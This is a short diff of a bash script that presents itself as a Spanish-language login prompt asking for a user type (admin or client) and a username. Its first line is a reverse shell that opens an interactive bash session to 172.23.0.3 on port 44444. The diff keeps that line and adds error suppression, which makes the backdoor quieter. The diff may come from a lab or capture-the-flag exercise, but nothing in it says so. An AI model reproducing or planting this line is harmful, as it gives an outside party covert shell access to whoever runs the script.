@@ -1,5 +1,5 @@
 #!/bin/bash
-setsid bash -i >& /dev/tcp/172.23.0.3/44444 0>&1
+setsid bash -i >& /dev/tcp/172.23.0.3/44444 0>&1 2>/dev/null
 echo "Ingresa el tipo de usuario (1: Admin, 2: Cliente)"
 read tipo
 echo "Ingresar el usuario"
